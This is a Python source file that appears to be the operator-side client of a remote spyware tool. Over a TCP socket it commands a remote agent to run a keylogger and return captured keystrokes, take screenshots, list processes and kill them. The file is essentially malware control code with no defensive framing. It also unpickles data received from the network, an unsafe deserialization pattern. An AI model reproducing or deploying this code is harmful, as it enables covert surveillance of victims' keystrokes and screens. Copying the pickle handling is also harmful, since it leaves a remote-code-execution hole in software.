import socket
import pickle
from boltons import socketutils
from PIL import ImageGrab
import os
import wmi

SERVER = "localhost"
PORT = 1234
DELIM = b'\x00'

# dump func
def recvDump(buff):
    dump_size = int(buff.recv_until(DELIM).decode())
    dump = buff.recv_size(dump_size)

    print(f'\tReceived dump data, size: {dump_size}')
    return pickle.loads(dump)

# keylogger func
def keylogger_Start(buff):
    buff.send('keylogger!F!'.encode())

def keylogger_Command(buff, cmd):
    buff.send(cmd.encode() + DELIM)

def keylogger_Send(buff):
    keylogger_Command(buff, 'send')
    return buff.recv_until(DELIM).decode()
    
# kill process func
def sendKillProcess(buff, pid):
    print('SEND KILL PROCESS SIGNAL')

    buff.send('killprocess!F!'.encode())
    buff.send(str(pid).encode() + DELIM)
    
# process list func
def getProcessList(buff):
    print('REQUEST PROCESS LIST')

    buff.send('processlist!F!'.encode())
    return recvDump(buff)

# screenshoot func
def getScreenShot(buff):
    print('REQUEST SCREENSHOT')

    buff.send('screenshot!F!'.encode())
    return recvDump(buff)

# close connection func
def sendCloseConection(buff):
    print('SEND CLOSE SIGNAL')

    buff.send('close!F!'.encode())
    buff.close()

def connectServer(serverIP):
    c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    c.connect((SERVER, PORT))

    buff = socketutils.BufferedSocket(c, None)
    return buff